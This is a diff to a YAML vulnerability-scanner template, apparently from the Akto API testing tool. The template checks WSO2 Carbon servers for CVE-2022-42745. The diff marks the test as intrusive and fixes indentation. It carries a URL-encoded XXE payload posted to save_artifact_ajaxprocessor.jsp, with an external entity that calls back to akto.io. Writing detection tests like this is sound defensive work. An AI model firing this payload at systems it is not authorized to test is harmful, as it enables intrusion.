@@ -24,6 +24,8 @@ info:
   cve:
     - CVE-2022-42745
 
+settings:
+  nature: INTRUSIVE
 api_selection_filters:
   response_code:
     gte: 200
@@ -33,7 +35,7 @@ api_selection_filters:
       gt: 0
     not_contains:
       - Error
-      - Internal Server 
+      - Internal Server
       - Failed
       - Unauthorized
       - access denied
@@ -65,10 +67,10 @@ execute:
   type: single
   requests:
     - req:
-      - modify_url: "/carbon/generic/save_artifact_ajaxprocessor.jsp"
-      - modify_header:
-          content-type: "application/x-www-form-urlencoded"
-      - replace_body: 'payload=<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+a+[+<!ENTITY+%25+xxe+SYSTEM+"http%3a//akto.io">%25xxe%3b]>'
+        - modify_url: "/carbon/generic/save_artifact_ajaxprocessor.jsp"
+        - modify_header:
+            content-type: "application/x-www-form-urlencoded"
+        - replace_body: 'payload=<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+a+[+<!ENTITY+%25+xxe+SYSTEM+"http%3a//akto.io">%25xxe%3b]>'
 validate:
   response_payload:
     length:
